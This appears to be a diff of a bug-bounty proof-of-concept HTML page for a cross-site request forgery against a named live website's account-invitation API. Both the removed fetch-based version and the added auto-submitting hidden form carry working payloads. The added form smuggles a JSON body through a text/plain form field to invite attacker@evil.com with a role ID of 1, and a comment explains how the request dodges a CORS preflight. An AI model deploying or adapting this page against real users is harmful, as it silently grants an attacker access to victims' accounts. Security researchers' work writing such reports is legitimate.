@@ -1,26 +1,4 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>CSRF PoC - Inviting Account</title>
-</head>
-<body>
-  <h3>CSRF PoC: /api/account/inviting</h3>
-  <script>
-    fetch("https://www.sellingpilot.com/api/account/inviting?_xhr=true", {
-      method: "POST",
-      credentials: "include",
-      headers: {
-        "Content-Type": "text/plain" // dipakai agar request dianggap "simple request" (hindari preflight CORS)
-      },
-      body: JSON.stringify({
-        name: "victim hackerone",
-        email: "hackerkorban8@gmail.com",
-        roleId: 1,
-        status: 0,
-        vendorId: null,
-        lang: "en-us"
-      })
-    });
-  </script>
-</body>
-</html>
+<form action="https://www.sellingpilot.com/api/account/inviting?_xhr=true" method="POST" enctype="text/plain">
+  <input type="hidden" name='{"name":"x", "email":"attacker@evil.com","roleId":1,"status":0,"vendorId":null,"lang":"en-us"}' value="">
+</form>
+<script>document.forms[0].submit()</script>
